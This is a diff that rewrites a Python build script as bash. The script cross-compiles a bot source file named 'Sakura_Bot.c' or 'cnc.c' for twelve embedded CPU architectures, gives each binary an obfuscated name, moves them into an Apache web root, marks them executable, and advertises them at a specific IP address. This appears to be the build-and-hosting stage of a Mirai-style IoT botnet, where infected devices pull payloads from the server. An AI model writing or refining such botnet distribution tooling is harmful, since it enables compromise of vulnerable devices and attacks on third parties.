@@ -1,45 +1,63 @@
-import os
-import subprocess
-import shutil
+#!/usr/bin/env bash
+set -e
 
-# Set your bot source file here
-bot_source = "cnc.c"  # or "Sakura_Bot.c" if that's your source
+# 1) Adjust these if needed:
+SRC="Sakura_Bot.c"   # or "cnc.c"
+WEBROOT="/var/www/html"
 
-# Output names for the binaries
-compileas = [
-    "m-i.p-s.Sakura", "m-p.s-l.Sakura", "s-h.4-.Sakura", "x-8.6-.Sakura",
-    "a-r.m-6.Sakura", "x-3.2-.Sakura", "a-r.m-7.Sakura", "p-p.c-.Sakura",
-    "i-5.8-6.Sakura", "m-6.8-k.Sakura", "p-p.c-.Sakura", "a-r.m-4.Sakura", "a-r.m-5.Sakura"
-]
+# 2) Cross-compiler dirs (must match order below)
+ccs=(
+  cross-compiler-mips
+  cross-compiler-mipsel
+  cross-compiler-sh4
+  cross-compiler-x86_64
+  cross-compiler-armv6l
+  cross-compiler-i686
+  cross-compiler-powerpc
+  cross-compiler-i586
+  cross-compiler-m68k
+  cross-compiler-armv7l
+  cross-compiler-armv4l
+  cross-compiler-armv5l
+)
 
-# Folders of cross-compilers
-ccs = [
-    "cross-compiler-mips", "cross-compiler-mipsel", "cross-compiler-sh4",
-    "cross-compiler-x86_64", "cross-compiler-armv6l", "cross-compiler-i686",
-    "cross-compiler-powerpc", "cross-compiler-i586", "cross-compiler-m68k",
-    "cross-compiler-armv7l", "cross-compiler-armv4l", "cross-compiler-armv5l"
-]
+# 3) Desired output names in the same order
+compileas=(
+  m-i.p-s.Sakura
+  m-p.s-l.Sakura
+  s-h.4-.Sakura
+  x-8.6-.Sakura
+  a-r.m-6.Sakura
+  x-3.2-.Sakura
+  a-r.m-7.Sakura
+  p-p.c-.Sakura
+  i-5.8-6.Sakura
+  m-6.8-k.Sakura
+  a-r.m-4.Sakura
+  a-r.m-5.Sakura
+)
 
-def run(cmd):
-    print(f"[*] Running: {cmd}")
-    subprocess.call(cmd, shell=True)
+# 4) Compile loop
+for i in "${!ccs[@]}"; do
+  dir="${ccs[$i]}"
+  out="${compileas[$i]}"
+  arch="${dir#cross-compiler-}"
+  gcc_bin="./${dir}/bin/${arch}-gcc"
 
-# Create the folder to store compiled files (in case it doesn't exist)
-output_folder = "/var/www/html"
-if not os.path.exists(output_folder):
-    os.makedirs(output_folder)
+  echo "[*] Compiling $SRC for $arch → $out"
+  "$gcc_bin" -static -pthread -o "$out" "$SRC"
+done
 
-# Start compiling and move the files
-for index, cc in enumerate(ccs):
-    try:
-        arch = [f for f in os.listdir(f"./{cc}/bin") if f.endswith("gcc")][0].split("-")[0]
-        compiler = f"./{cc}/bin/{arch}-gcc"
-        output = compileas[index]
-        cmd = f"{compiler} -static -pthread -o {output} {bot_source}"
-        run(cmd)
-        
-        # Move compiled file to the web server directory
-        shutil.move(output, f"{output_folder}/{output}")
-        
-    except Exception as e:
-        print(f"[!] Error with {cc}: {e}")
+# 5) Copy into Apache’s web root
+echo "[*] Copying binaries to $WEBROOT"
+for out in "${compileas[@]}"; do
+  mv -f "$out" "$WEBROOT/"
+done
+
+# 6) Ensure they’re executable
+chmod +x "$WEBROOT"/*.Sakura
+
+# 7) Restart Apache (on Ubuntu)
+systemctl restart apache2
+
+echo "[✔] Done! Browse http://196.77.63.59:8080 to see your binaries."
